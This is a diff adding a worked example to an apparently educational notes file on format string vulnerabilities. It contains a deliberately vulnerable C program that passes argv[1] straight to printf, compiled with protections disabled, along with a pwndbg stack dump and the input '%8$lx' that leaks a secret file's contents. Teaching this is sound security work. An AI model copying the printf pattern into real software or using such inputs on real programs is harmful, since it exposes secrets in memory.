@@ -1296,6 +1296,68 @@ In reading :
 - %x, %p : display the content of the stack (bypass ASLR)
 - %s : interprets a value of the stack as a pointer and dereferences allows the arbitrary reading of memory (or the DOS)
 
+For example if we take the this code snippet :
+```c
+#include <stdio.h>
+int main(int argc, char *argv[]){
+
+    FILE *password = fopen(".asecretfile", "rt");
+    char buffer[32];
+    fgets(buffer, sizeof(buffer), password);
+
+    printf(argv[1]);
+
+    fclose(password);
+
+    return 0;
+}
+/*
+gcc code.c -o code -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 -O0
+*/
+```
+
+If we compile it for x64, we can easily retrieve the secret value :
+```bash
+pwndbg> b *0x00000000004011aa   # BREAKPOINT just on the printf function
+Breakpoint 1 at 0x4011aa
+
+pwndbg> run AAAAAAAAAAAAAA   # Run it with a value
+Starting program: /workspace/code AAAAAAAAAAAAAA
+
+[...]
+
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffccf543af0 —▸ 0x7ffccf543c48 —▸ 0x7ffccf5441df ◂— '/workspace/code'
+01:0008│-038 0x7ffccf543af8 ◂— 0x200000000
+02:0010│-030 0x7ffccf543b00 ◂— 'HELLLOOOOOOO\n'     # As we can see the value of the .asecretfile is stored in 0x7ffccf543b00
+03:0018│-028 0x7ffccf543b08 ◂— 0xa4f4f4f4f /* 'OOOO\n' */
+04:0020│-020 0x7ffccf543b10 ◂— 0
+05:0028│-018 0x7ffccf543b18 —▸ 0x706752a18fc0 (dl_main) ◂— push rbp
+06:0030│-010 0x7ffccf543b20 ◂— 0
+07:0038│-008 0x7ffccf543b28 —▸ 0x79052a0 ◂— 0xfbad2488
+
+
+pwndbg> x/50xw $sp  # And this addresse start at the 8 bytes of the stack
+0x7ffccf543af0: 0xcf543c48      0x00007ffc      0x00000000      0x00000002
+0x7ffccf543b00: 0x4c4c4548      0x4f4f4f4c      0x4f4f4f4f      0x0000000a
+0x7ffccf543b10: 0x00000000      0x00000000      0x52a18fc0      0x00007067
+0x7ffccf543b20: 0x00000000      0x00000000      0x079052a0      0x00000000
+0x7ffccf543b30: 0x00000002      0x00000000      0x5282624a      0x00007067
+0x7ffccf543b40: 0xcf543c30      0x00007ffc      0x00401156      0x00000000
+0x7ffccf543b50: 0x00400040      0x00000002      0xcf543c48      0x00007ffc
+0x7ffccf543b60: 0xcf543c48      0x00007ffc      0x8b454ab6      0xf1a7ed59
+0x7ffccf543b70: 0x00000000      0x00000000      0xcf543c60      0x00007ffc
+0x7ffccf543b80: 0x004030f0      0x00000000      0x52a30020      0x00007067
+0x7ffccf543b90: 0xfdc14ab6      0x0e5e73f1      0x4f454ab6      0x1169485d
+0x7ffccf543ba0: 0x00000000      0x00000000      0x00000000      0x00000000
+0x7ffccf543bb0: 0x00000000      0x00000000
+```
+
+```
+./code '%8$lx'                                                                   
+4f4f4f4c4c4c4548    # OOOLLLEH
+```
+
 And in writing :
 - %n writes the number of characters already displayed at the address pointed by the corresponding argument
 
